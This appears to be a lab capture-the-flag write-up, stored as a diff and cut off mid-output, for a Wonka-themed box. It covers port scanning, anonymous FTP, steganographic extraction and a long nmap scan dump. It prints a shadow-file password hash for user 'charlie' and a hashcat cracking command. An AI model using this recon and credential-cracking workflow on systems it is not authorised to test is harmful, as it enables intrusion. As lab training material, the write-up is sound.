@@ -1,0 +1,823 @@
+so this was a pretty good box i started with port scanning first
+
+rustscan -a 10.10.115.173
+dammm so many open ports
+
+Open 10.10.115.173:22
+Open 10.10.115.173:21
+Open 10.10.115.173:109
+Open 10.10.115.173:106
+Open 10.10.115.173:125
+Open 10.10.115.173:100
+Open 10.10.115.173:120
+Open 10.10.115.173:123
+Open 10.10.115.173:112
+Open 10.10.115.173:113
+Open 10.10.115.173:114
+Open 10.10.115.173:102
+Open 10.10.115.173:104
+Open 10.10.115.173:115
+Open 10.10.115.173:117
+Open 10.10.115.173:119
+Open 10.10.115.173:107
+Open 10.10.115.173:80
+Open 10.10.115.173:105
+Open 10.10.115.173:118
+Open 10.10.115.173:103
+Open 10.10.115.173:108
+Open 10.10.115.173:122
+Open 10.10.115.173:110
+Open 10.10.115.173:111
+Open 10.10.115.173:121
+Open 10.10.115.173:124
+Open 10.10.115.173:101
+Open 10.10.115.173:116
+
+before doing the nmap scan i though of doing a manual enumeration on common ports like 21 and 80 so visited port 21 which is ftp and saw a file with ext .jpg
+
+ftp 10.10.115.173
+
+got a file and downloaded it
+
+the file was gum_room.jpg
+
+i though of seeing through the embed data by binwalk and exiftool
+but havent got anything by that then i decided to do steghide and get any embed data
+
+steghide --extract -sf gum_room.jpg
+
+now steghide asked me for a passphrase i randomly tried to put nothing and see what happens and the passphrase was nothing in this case! it gave me shadow file which contains the password hash of charlie so i thought of cracking using hashcat 
+
+copied the password hash of charlie
+
+charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
+
+
+and pasted in a file and started the hashcat
+
+hashcat -m 1800 -a 0 hash wordlist -t63
+
+i almost completed after 30 min till the time i was busy doing other enumeration stuff
+
+after this as it was taking alot of time i though of doing a nmap scan on the open port 
+so did an nmap scan
+
+nmap -sC -sV -p21,22,80,100,101,102,103,104,105,105,107,109,110,111,112,113,115,116,118,119,120,121,122,125 -vvv 10.10.115.173
+
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-03 11:18 IST
+WARNING: Duplicate port number(s) specified.  Are you alert enough to be using Nmap?  Have some coffee or Jolt(tm).
+NSE: Loaded 153 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 11:18
+Completed NSE at 11:18, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 11:18
+Completed NSE at 11:18, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 11:18
+Completed NSE at 11:18, 0.00s elapsed
+Initiating Ping Scan at 11:18
+Scanning 10.10.115.173 [2 ports]
+Completed Ping Scan at 11:18, 0.19s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 11:18
+Completed Parallel DNS resolution of 1 host. at 11:18, 0.01s elapsed
+DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
+Initiating Connect Scan at 11:18
+Scanning 10.10.115.173 [23 ports]
+Discovered open port 115/tcp on 10.10.115.173
+Discovered open port 111/tcp on 10.10.115.173
+Discovered open port 22/tcp on 10.10.115.173
+Discovered open port 80/tcp on 10.10.115.173
+Discovered open port 21/tcp on 10.10.115.173
+Discovered open port 121/tcp on 10.10.115.173
+Discovered open port 104/tcp on 10.10.115.173
+Discovered open port 113/tcp on 10.10.115.173
+Discovered open port 110/tcp on 10.10.115.173
+Discovered open port 112/tcp on 10.10.115.173
+Discovered open port 107/tcp on 10.10.115.173
+Discovered open port 102/tcp on 10.10.115.173
+Discovered open port 105/tcp on 10.10.115.173
+Discovered open port 116/tcp on 10.10.115.173
+Discovered open port 100/tcp on 10.10.115.173
+Discovered open port 109/tcp on 10.10.115.173
+Discovered open port 122/tcp on 10.10.115.173
+Discovered open port 103/tcp on 10.10.115.173
+Discovered open port 125/tcp on 10.10.115.173
+Discovered open port 119/tcp on 10.10.115.173
+Discovered open port 120/tcp on 10.10.115.173
+Discovered open port 118/tcp on 10.10.115.173
+Discovered open port 101/tcp on 10.10.115.173
+Completed Connect Scan at 11:18, 0.41s elapsed (23 total ports)
+Initiating Service scan at 11:18
+Scanning 23 services on 10.10.115.173
+Service scan Timing: About 17.39% done; ETC: 11:33 (0:12:50 remaining)
+Completed Service scan at 11:20, 168.47s elapsed (23 services on 1 host)
+NSE: Script scanning 10.10.115.173.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 11:20
+NSE Timing: About 98.16% done; ETC: 11:21 (0:00:01 remaining)
+NSE: [ftp-bounce 10.10.115.173:21] PORT response: 500 Illegal PORT command.
+NSE Timing: About 98.74% done; ETC: 11:22 (0:00:01 remaining)
+NSE Timing: About 99.13% done; ETC: 11:22 (0:00:01 remaining)
+NSE Timing: About 99.51% done; ETC: 11:23 (0:00:01 remaining)
+NSE Timing: About 99.58% done; ETC: 11:23 (0:00:01 remaining)
+NSE Timing: About 99.68% done; ETC: 11:24 (0:00:01 remaining)
+Completed NSE at 11:24, 193.22s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 11:24
+Stats: 0:06:26 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE: Active NSE Script Threads: 7 (7 waiting)
+NSE Timing: About 96.28% done; ETC: 11:24 (0:00:01 remaining)
+Stats: 0:06:27 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE: Active NSE Script Threads: 7 (7 waiting)
+NSE Timing: About 96.28% done; ETC: 11:24 (0:00:01 remaining)
+NSE Timing: About 98.40% done; ETC: 11:25 (0:00:01 remaining)
+NSE Timing: About 99.47% done; ETC: 11:25 (0:00:00 remaining)
+NSE Timing: About 99.47% done; ETC: 11:26 (0:00:01 remaining)
+Completed NSE at 11:26, 129.31s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 11:26
+Completed NSE at 11:26, 0.00s elapsed
+Nmap scan report for 10.10.115.173
+Host is up, received conn-refused (0.20s latency).
+Scanned at 2021-07-03 11:18:08 IST for 492s
+
+PORT    STATE SERVICE     REASON  VERSION
+21/tcp  open  ftp         syn-ack vsftpd 3.0.3
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.17.12.104
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp  open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| ssh-hostkey: 
+|   2048 16:31:bb:b5:1f:cc:cc:12:14:8f:f0:d8:33:b0:08:9b (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuEAWoQHbW+vehIUZLTiJyXKjUAAJP0sgW/P0LHVaf4C5+1oEBXcDBBZC7SoL6MTMYn8zlEfhCbjQb7A/Yf2IxLzU5f35yuhEbWEvYmuP4PmBB04CJdDItU0xwAbGsufyzZ6td6LKm+oim8xJn/lVTeykVZTASF9iuY9tqwA933AfjqKlNByj82TAmlVkQ93bq+e7Gu/pRkSn++RkIUd4f8ogmLLusEh+vbGkZDj4UdwTIZbOSeuS4oz/umpkJPhekGVoyzjPMRIq9cwdeKIVRwUNbp4BoJjYKjbCC9YY8u/7O6lhtwo4uAp7Q9PfRRCiCpVimm6kIgBmgqqKbueDl
+|   256 e7:1f:c9:db:3e:aa:44:b6:72:10:3c:ee:db:1d:33:90 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAYfNs0w6oOdzMM4B2JyB5pWr1qq9oB+xF0Voyn4gBYEGPC9+dqPudYagioH1ArjIHZFF0G24rt7L/6x1OPJSts=
+|   256 b4:45:02:b6:24:8e:a9:06:5f:6c:79:44:8a:06:55:5e (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAwurtl1AFxJU7cHOfbCNr34YoTmAVnVUIXt4QHPD1B2
+80/tcp  open  http        syn-ack Apache httpd 2.4.29 ((Ubuntu))
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| http-methods: 
+|_  Supported Methods: POST OPTIONS HEAD GET
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+100/tcp open  newacct?    syn-ack
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     "Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus"
+101/tcp open  hostname?   syn-ack
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     "Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus"
+102/tcp open  iso-tsap?   syn-ack
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     "Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus"
+103/tcp open  gppitnp?    syn-ack
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     "Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus"
+104/tcp open  acr-nema?   syn-ack
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+|_dicom-ping: 
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     "Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus"
+105/tcp open  csnet-ns?   syn-ack
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GetRequest, HTTPOptions: 
+|     "Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus"
+107/tcp open  rtelnet?    syn-ack
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     "Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus"
+109/tcp open  pop2?       syn-ack
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     "Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus"
+110/tcp open  pop3?       syn-ack
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     "Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus"
+111/tcp open  rpcbind?    syn-ack
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GetRequest, HTTPOptions: 
+|     "Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus"
+112/tcp open  mcidas?     syn-ack
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     "Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus"
+113/tcp open  ident?      syn-ack
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, NCP, NULL: 
+|_    http://localhost/key_rev_key <- You will find the key here!!!
+115/tcp open  sftp?       syn-ack
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     "Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus"
+116/tcp open  ansanotify? syn-ack
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     "Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus"
+118/tcp open  sqlserv?    syn-ack
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     "Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus"
+119/tcp open  nntp?       syn-ack
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GetRequest, Help: 
+|     "Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus"
+120/tcp open  cfdptkt?    syn-ack
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     "Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus"
+121/tcp open  erpc?       syn-ack
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     "Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus"
+122/tcp open  smakynet?   syn-ack
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GetRequest, RTSPRequest: 
+|     "Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus"
+125/tcp open  locus-map?  syn-ack
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     "Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus"
+9 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port100-TCP:V=7.91%I=7%D=7/3%Time=60DFFA1F%P=x86_64-pc-linux-gnu%r(NULL
+SF:,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20___
+SF:\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r\n\x20
+SF:\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20____\x20
+SF:___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_:\
+SF:\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__\\'
+SF:\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\r\n
+SF:\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20\x2
+SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\x20
+SF:\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-----------------`\
+SF:r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x20\
+SF:x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+SF:x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|__________
+SF:____________;________________\|\r\n\r\nA\x20small\x20hint\x20from\x20Mr
+SF:\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x20;\
+SF:)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20")%r(Generi
+SF:cLines,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\
+SF:x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r
+SF:\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20__
+SF:__\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\
+SF:x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\
+SF:\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20
+SF:\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\
+SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x
+SF:20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-------------
+SF:----`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x2
+SF:0\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|____
+SF:__________________;________________\|\r\n\r\nA\x20small\x20hint\x20from
+SF:\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!
+SF:\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port101-TCP:V=7.91%I=7%D=7/3%Time=60DFFA1F%P=x86_64-pc-linux-gnu%r(NULL
+SF:,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20___
+SF:\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r\n\x20
+SF:\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20____\x20
+SF:___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_:\
+SF:\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__\\'
+SF:\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\r\n
+SF:\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20\x2
+SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\x20
+SF:\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-----------------`\
+SF:r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x20\
+SF:x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+SF:x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|__________
+SF:____________;________________\|\r\n\r\nA\x20small\x20hint\x20from\x20Mr
+SF:\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x20;\
+SF:)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20")%r(Generi
+SF:cLines,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\
+SF:x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r
+SF:\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20__
+SF:__\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\
+SF:x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\
+SF:\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20
+SF:\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\
+SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x
+SF:20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-------------
+SF:----`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x2
+SF:0\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|____
+SF:__________________;________________\|\r\n\r\nA\x20small\x20hint\x20from
+SF:\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!
+SF:\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port102-TCP:V=7.91%I=7%D=7/3%Time=60DFFA1F%P=x86_64-pc-linux-gnu%r(NULL
+SF:,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20___
+SF:\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r\n\x20
+SF:\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20____\x20
+SF:___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_:\
+SF:\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__\\'
+SF:\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\r\n
+SF:\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20\x2
+SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\x20
+SF:\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-----------------`\
+SF:r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x20\
+SF:x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+SF:x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|__________
+SF:____________;________________\|\r\n\r\nA\x20small\x20hint\x20from\x20Mr
+SF:\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x20;\
+SF:)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20")%r(Generi
+SF:cLines,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\
+SF:x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r
+SF:\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20__
+SF:__\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\
+SF:x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\
+SF:\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20
+SF:\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\
+SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x
+SF:20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-------------
+SF:----`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x2
+SF:0\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
